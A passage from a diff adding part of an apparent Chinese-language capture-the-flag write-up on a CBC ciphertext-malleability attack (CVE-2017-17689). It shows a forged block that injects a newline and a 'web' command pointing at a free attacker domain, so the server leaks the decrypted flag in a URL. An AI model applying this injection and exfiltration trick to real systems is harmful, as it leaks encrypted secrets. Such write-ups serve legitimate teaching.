+<p>受限於 block size 的限制，我們的 domain name 要越短越好，所以直接上 <a href="http://dot.tk/">dot.tk</a> 申請一個免洗的 top domain，四個字 <code>abcd.tk</code> 是不用錢的。</p>
+<p>回到題目，這裡第 8 個 block 解爛不會怎樣，反正有第 9 個 block 的單引號就好，所以我們可以把第 9 個 block 變成 <code>&#39;\nweb  &#39;abcd.tk/</code> （其實 domain也不用這麼短），後面 parse 會補 <code>http://</code>，第 10 個 block 之後就接 flag 解密的 block，就能看到 server 把 flag 放在 url 傳回來了。</p>
+<p>Flag 有提到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17689">CVE-2017-17689</a> ，就是對 CBC 操作控制明文的 bug。</p>
+        </article>
+      </div>
+      <!-- Main Col END -->
+
+    </div>
+    <!-- body-row END -->
+  </body>
+</html>
+
